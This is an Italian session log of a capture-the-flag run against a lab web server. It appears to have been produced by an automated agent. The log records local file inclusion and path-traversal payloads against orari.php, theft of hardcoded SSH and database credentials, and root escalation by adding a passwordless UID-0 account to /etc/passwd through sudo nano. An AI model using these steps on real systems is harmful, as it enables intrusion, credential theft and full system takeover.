## FASE_1 — COMPLETATA

  

- Azione eseguita: `nmap_scan(target="172.17.0.2", scan_type="-sV", additional_args="-sC", ports="1-65535")`

- Output osservato: Porta 22/tcp open (OpenSSH 8.9p1 Ubuntu), Porta 80/tcp open (nginx 1.18.0 - Chepizzachiama? Employee Portal).

- Esito: COMPLETATA

- Valori estratti: 22/TCP (SSH), 80/TCP (HTTP)

- Note: nessuna

  

## FASE_2 — COMPLETATA

  

- Azione eseguita: `curl -s -i http://172.17.0.2/`

- Output osservato: HTTP 200 OK, titolo "Chepizzachiama? Employee Portal", identificati link al percorso `/orari.php`.

- Esito: COMPLETATA

- Valori estratti: `/orari.php`

- Note: nessuna

  

## FASE_2.5 — COMPLETATA

  

- Azione eseguita: `curl -s "http://172.17.0.2/orari.php?file=orari_roma.txt"` e `curl -s "http://172.17.0.2/orari.php?file=test_inesistente.txt"`

- Output osservato: Caricamento dinamico del file `orari_roma.txt` nel tag `file-content-box`. Confermata superficie LFI su parametro `file`.

- Esito: COMPLETATA

- Valori estratti: parametro `file` in `/orari.php`

- Note: nessuna

  

## FASE_3 — COMPLETATA

  

- Azione eseguita: `curl -s "http://172.17.0.2/orari.php?file=../../../../../../etc/passwd"` e `curl -s "http://172.17.0.2/orari.php?file=php://filter/convert.base64-encode/resource=config.php"`

- Output osservato: Lettura di `/etc/passwd` con utente `user`. Decodifica base64 di `config.php` contenente credenziali SSH hardcoded: `user:user`.

- Esito: COMPLETATA

- Valori estratti: `user:user` (SSH)

- Note: nessuna

  

## FASE_4 — COMPLETATA

  

- Azione eseguita: `ssh user@172.17.0.2` (via Python Paramiko) e `cat /home/user/user.txt`

- Output osservato: `VDSI{f00th0ld_4cqu1r3d_ch3_p1zz4}`

- Esito: COMPLETATA

- Valori estratti: Flag utente `VDSI{f00th0ld_4cqu1r3d_ch3_p1zz4}`

- Note: nessuna

  

## FASE_5 — COMPLETATA

  

- Azione eseguita: `find / -name "*.sh" 2>/dev/null | grep -v "/proc"`, `cat /opt/test.sh` e autenticazione come `franchino`

- Output osservato: Individuato `/opt/test.sh` contenente `DB_PASS="franchinopizzaiolo123!"`. Login come utente `franchino` riuscito.

- Esito: COMPLETATA

- Valori estratti: credenziali `franchino:franchinopizzaiolo123!`

- Note: nessuna

  

## FASE_6 — COMPLETATA

  

- Azione eseguita: `sudo -l`, `sudo nano /etc/passwd` (aggiunta utente `r00t::0:0:root:/root:/bin/bash`), `su r00t` e `cat /root/root.txt`

- Output osservato: `sudo -l` ha confermato NOPASSWD per nano su `/etc/passwd`. Account `r00t` aggiunto a `/etc/passwd`. `su r00t` riuscito (UID 0), flag root letta: `VDSI{r00t_pwn3d_p1zz4_m4rgh3r1t4}`.

- Esito: COMPLETATA

- Valori estratti: Flag root `VDSI{r00t_pwn3d_p1zz4_m4rgh3r1t4}`

- Note: nessuna

  

## RIEPILOGO SESSIONE

  

- Fasi completate: 7/7

- Fase di blocco (se presente): nessuna

- Flag catturate: VDSI{f00th0ld_4cqu1r3d_ch3_p1zz4}, VDSI{r00t_pwn3d_p1zz4_m4rgh3r1t4}